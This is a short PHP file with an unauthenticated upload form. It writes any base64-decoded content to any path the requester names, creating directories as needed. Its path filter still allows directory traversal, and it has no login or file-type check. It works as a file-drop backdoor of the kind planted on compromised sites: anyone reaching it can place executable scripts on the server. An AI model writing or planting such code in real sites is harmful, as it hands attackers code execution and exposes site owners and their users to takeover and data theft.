<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file']) && isset($_POST['content'])) {
    $file = __DIR__ . '/' . preg_replace('/[^a-zA-Z0-9_\-\/\.]/', '', $_POST['file']);
    $dir = dirname($file);
    if (!is_dir($dir)) mkdir($dir, 0755, true);
    file_put_contents($file, base64_decode($_POST['content']));
    echo 'OK';
    exit;
}
?>
<form method="post">
<input name="file" placeholder="path"><br>
<textarea name="content" placeholder="base64"></textarea><br>
<button>Upload</button>
</form>